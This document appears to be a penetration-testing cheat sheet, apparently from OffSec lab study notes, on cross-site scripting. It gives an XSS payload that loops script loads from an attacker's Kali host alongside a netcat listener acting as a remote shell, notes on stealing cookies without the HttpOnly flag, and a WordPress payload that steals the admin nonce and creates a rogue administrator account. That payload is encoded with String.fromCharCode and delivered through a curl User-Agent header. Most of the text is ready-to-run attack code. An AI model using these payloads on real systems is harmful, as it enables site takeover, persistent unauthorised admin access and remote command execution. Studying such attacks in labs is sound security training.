### XSS to NC Reverse Shell
```
<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//your-kali-linux-ip:4444";d.body.appendChild(z)},0)</script>

while :; do printf "zemo>$ "; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done {type in kali linu}
```

### XSS to steal cookie
>The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.

>The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
### XSS to Privilege Escalation
Js to capture the word press nounce
```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
Minify the above js code
```
https://jscompress.com/
```
Encode the minified js code
```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
Launch the attack
```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(insert the encoded js here))</script>" --proxy 127.0.0.1:8080
```
